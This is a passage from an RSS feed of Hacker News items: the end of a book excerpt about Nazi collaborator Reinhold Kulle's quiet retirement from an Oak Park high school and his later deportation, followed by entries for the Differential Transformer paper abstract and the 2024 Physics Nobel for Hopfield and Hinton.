<p>Gignilliat moved back from the microphone. Toperoff stood up, applauding. So did Lunin Schultz and dozens of others.</p>



<p>It was over. Kulle was gone.</p>



<p>A group of Kulle’s friends a couple of rows away heckled loudly. “Where do these Jews come from? They rise from the ashes!”</p>



<p>Jeffrey Greenwald, a sophomore, stood with his parents and heard a scolding voice a few rows behind him: “Wir bleiben setzen.”</p>



<p>He turned around to see Herr Schoepko, the German teacher, and leaned over to his father, confused. “We stay seated,” his father translated.</p>



<p>Chills went down the boy’s spine.</p>



<p>The announcement had done exactly what the board had hoped. Kulle’s opponents were happy, and the board would soon be able to move on from the turmoil and return to its work running the school. Though Kulle’s colleagues would be upset, Swanson would be able to handle the faculty.</p>



<p>But Reinhold Kulle had not been fired. He would be allowed an early retirement, and the board would give him a severance package. School officials would work with the retirement fund and Kulle’s lawyers to find the best possible solution for his family. They would do their best to take care of him. It was a compromise between the board and the administration, a way of satisfying those who wanted Kulle gone and those who thought the school still owed him loyalty.</p>



<p>And it would all be kept quiet. There would be no additional public announcements. The board would be careful to discuss the topic only in closed session, and the notes from those meetings would be kept sealed for nearly 40 years — one of the high school’s best-kept secrets.</p>





<p><span>I</span>n November 1984, the judge in the deportation hearing finally issued her ruling. The evidence was “clear, convincing, and unequivocal,” she wrote, that Reinhold Kulle had participated in persecution under the direction of the Nazi Reich.</p>



<p>After a series of failed appeals, Kulle was taken into custody at his Brookfield home on a Friday night in October 1987. The following Monday, he was put on a plane to Germany. Once there, he headed to a relative’s home in Lahr, the city he had left 30 years earlier. West Germany’s chief Nazi crimes prosecutor announced that Kulle would not face charges; a preliminary investigation had turned up “no indications of a crime that can still be prosecuted.”</p>



<p>After a few years, Kulle lost touch with most of his friends from Oak Park, though a reminder of his time at OPRF came in the mail each month in the form of a pension check from the Illinois Municipal Retirement Fund. Those payments stopped in 2006, when Reinhold Kulle died in Germany, at the age of 85, still a free man.</p>




<div><p><img decoding="async" src="https://www.chicagomag.com/wp-content/uploads/2024/08/kulle-book.jpg"></p><p>Adapted from <em>Our Nazi: An American Suburb’s Encounter With Evil</em> by Michael Soffer, with permission from the University of Chicago Press. © 2024 by the University of Chicago. All rights reserved.</p></div>




<p><span>Related Content</span></p>

        			
			      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Differential Transformer (485 pts)]]></title>
            <link>https://arxiv.org/abs/2410.05258</link>
            <guid>41776324</guid>
            <pubDate>Tue, 08 Oct 2024 11:54:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arxiv.org/abs/2410.05258">https://arxiv.org/abs/2410.05258</a>, See on <a href="https://news.ycombinator.com/item?id=41776324">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-inner">
    
    
                
    <p><a href="https://arxiv.org/pdf/2410.05258">View PDF</a>
    <a href="https://arxiv.org/html/2410.05258v1">HTML (experimental)</a></p><blockquote>
            <span>Abstract:</span>Transformer tends to overallocate attention to irrelevant context. In this work, we introduce Diff Transformer, which amplifies attention to the relevant context while canceling noise. Specifically, the differential attention mechanism calculates attention scores as the difference between two separate softmax attention maps. The subtraction cancels noise, promoting the emergence of sparse attention patterns. Experimental results on language modeling show that Diff Transformer outperforms Transformer in various settings of scaling up model size and training tokens. More intriguingly, it offers notable advantages in practical applications, such as long-context modeling, key information retrieval, hallucination mitigation, in-context learning, and reduction of activation outliers. By being less distracted by irrelevant context, Diff Transformer can mitigate hallucination in question answering and text summarization. For in-context learning, Diff Transformer not only enhances accuracy but is also more robust to order permutation, which was considered as a chronic robustness issue. The results position Diff Transformer as a highly effective and promising architecture to advance large language models.
    </blockquote>

    <!--CONTEXT-->
    
  </div><div>
      <h2>Submission history</h2><p> From: Li Dong [<a href="https://arxiv.org/show-email/9d386852/2410.05258">view email</a>]      <br>    <strong>[v1]</strong>
        Mon, 7 Oct 2024 17:57:38 UTC (429 KB)<br>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Nobel Prize in Physics Awarded for Machine Learning and Neural Networks (841 pts)]]></title>
            <link>https://www.nobelprize.org/prizes/physics/2024/summary/</link>
            <guid>41775463</guid>
            <pubDate>Tue, 08 Oct 2024 09:52:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nobelprize.org/prizes/physics/2024/summary/">https://www.nobelprize.org/prizes/physics/2024/summary/</a>, See on <a href="https://news.ycombinator.com/item?id=41775463">Hacker News</a></p>
Couldn't get https://www.nobelprize.org/prizes/physics/2024/summary/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[John Hopfield and Geoff Hinton Win Physics Nobel Prize [pdf] (151 pts)]]></title>
            <link>https://www.nobelprize.org/uploads/2024/10/press-physicsprize2024.pdf</link>
            <guid>41775449</guid>
            <pubDate>Tue, 08 Oct 2024 09:51:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nobelprize.org/uploads/2024/10/press-physicsprize2024.pdf">https://www.nobelprize.org/uploads/2024/10/press-physicsprize2024.pdf</a>, See on <a href="https://news.ycombinator.com/item?id=41775449">Hacker News</a></p>
&lt;Not HTML&gt;]]></description>
        </item>
    </channel>
</rss>